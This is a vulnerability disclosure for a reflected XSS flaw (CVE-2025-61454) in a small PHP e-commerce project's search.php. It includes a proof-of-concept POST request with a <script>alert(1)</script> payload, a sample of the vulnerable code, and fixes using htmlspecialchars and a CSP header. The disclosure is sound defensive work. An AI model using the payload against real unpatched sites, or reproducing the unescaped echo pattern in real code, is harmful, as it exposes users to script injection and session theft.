# 🛡️ CVE Disclosure: CVE-2025-61454 — Reflected XSS in E-commerce Project

**Disclosure Date:** 14 October 2025  
**CVE ID:** CVE-2025-61454  
**Severity:** MEDIUM (CVSS 6.1)

---

## 🧩 Summary

A reflected Cross-Site Scripting (XSS) vulnerability exists in the `E-commerce Project v1.0`, specifically within the `search.php` endpoint. Unsanitized input in the `search` parameter is directly reflected back into the response HTML, allowing attackers to execute arbitrary JavaScript in the browser of a user who visits a malicious link or submits a crafted request.

This issue has been assigned the identifier **CVE-2025-61454**. At the time of disclosure, **no patch** has been released by the vendor.

## 📦 Affected Product

- **Vendor:** Independent (Bhabishya-123)  
- **Project:** [E-commerce](https://github.com/Bhabishya-123/E-commerce)  
- **Version:** v1.0  
- **File:** `search.php`  
- **Vulnerable Endpoint:**  
  `http://localhost/e-commerce-main/search.php`

---

## 🔬 Vulnerability Details

The server fails to properly sanitize the `search` parameter from POST data before reflecting it into the response HTML. This allows attackers to inject JavaScript payloads, leading to client-side code execution.

An attacker crafts input containing embedded script-like content and sends it to the vulnerable POST endpoint. Because the server reflects the input into the HTML response without applying proper HTML/attribute/JS encoding, the browser treats the reflected content as executable markup and runs it. This is a reflected (non-persistent) XSS scenario; the attacker must persuade a victim to perform the request or visit a specially constructed link/form.

### Vulnerable Code Pattern (hypothetical):
```php
$search = $_POST['search'];
echo "<div>Search results for: $search</div>";
```

## 💥 Impact

A successful exploitation could result in:

- 🧠 **Execution of arbitrary JavaScript**
- 🎭 **Phishing or impersonation** via HTML injection
- 🍪 **Session hijacking or token theft**
- 🚨 **Forced redirection or malware delivery**
- 🎣 **Credential harvesting** through fake login forms
- 📊 **Defacement** of the search results page

---

## 🧪 Proof of Concept (PoC)

### 1. Clone the Repository

```bash
git clone https://github.com/Bhabishya-123/E-commerce.git
```

### 2. Host Locally

Use XAMPP/LAMP to deploy the project and access the application.

### 3. Exploit the Vulnerability

#### 📥 Sample Request
```http
POST /e-commerce-main/search.php HTTP/1.1
Host: localhost
Referer: https://localhost/e-commerce-main/
Content-Type: application/x-www-form-urlencoded

search=yxo9p%3cscript%3ealert(1)%3c%2fscript%3exnzmd&submit=
```

#### 📋 Decoded Payload
```
search=yxo9p<script>alert(1)</script>xnzmd&submit=
```

#### 📋 Injected Payload
```html
yxo9p<script>alert(1)</script>xnzmd
```

**Explanation:**  
The payload `<script>alert(1)</script>` is embedded within the search parameter. When a victim submits a search form with this malicious payload (or is tricked into doing so via social engineering), the JavaScript executes in their browser context.

### 4. Expected Result

If vulnerable, the browser will execute the JavaScript code, displaying an alert box with the value `1`. This confirms successful XSS exploitation.

## 🔐 Recommendations

- ✅ Use `htmlspecialchars()` or equivalent to encode all untrusted output before rendering to HTML.
- 🧰 Implement **server-side input validation** for all form inputs, especially the search parameter.
- 🧱 Set strong **Content Security Policy (CSP)** headers to prevent inline script execution.
- 🚫 Avoid directly embedding unsanitized user inputs into HTML responses.
- 🔒 Implement proper **output encoding** based on context (HTML, JavaScript, URL, CSS).
- 🛡️ Use modern frameworks that provide automatic XSS protection.

### ✅ Example Fix
```php
$search = htmlspecialchars($_POST['search'], ENT_QUOTES, 'UTF-8');
echo "<div>Search results for: $search</div>";
```

### 🛡️ Content Security Policy Example
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```
